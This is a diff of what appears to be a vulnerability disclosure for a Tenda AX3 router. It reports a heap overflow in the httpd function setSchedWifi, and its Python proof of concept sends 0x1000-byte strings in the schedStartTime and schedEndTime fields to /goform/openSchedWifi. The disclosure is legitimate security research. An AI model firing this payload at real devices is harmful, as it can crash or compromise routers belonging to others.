@@ -23,7 +23,7 @@ Vulnerability details
 The vulnerability is detected at **/bin/httpd** <br>
 
 In the function **setSchedWifi**, the content obtained by program through parameter **schedStartTime** and **schedEndTime** given by http is passed to variable **v5** and **v6**. However ,they will be copyed to the **v10** which is a heap ptr without any length check. <br>
-![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/0.png) <br>
+![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/4.png) <br>
 
 <br>
 
@@ -33,11 +33,12 @@ Proof of Code
 from pwn import *
 import requests
 
-url = "http://192.168.0.1/goform/fast_setting_wifi_set"
+url = "http://192.168.0.1/goform/openSchedWifi"
 
 payload = "a"*0x1000
 data = {
-    "ssid": payload,
+    "schedStartTime": payload,
+    "schedEndTime": payload,
 }
 res = requests.post(url=url,data=data)
 print(res.text)
@@ -45,6 +46,6 @@ print(res.text)
 
 Attack Demo
 ========
-![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/1.png)
-![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/2.png)
-![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/3.png)
+![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/7.png)
+![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/5.png)
+![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/6.png)
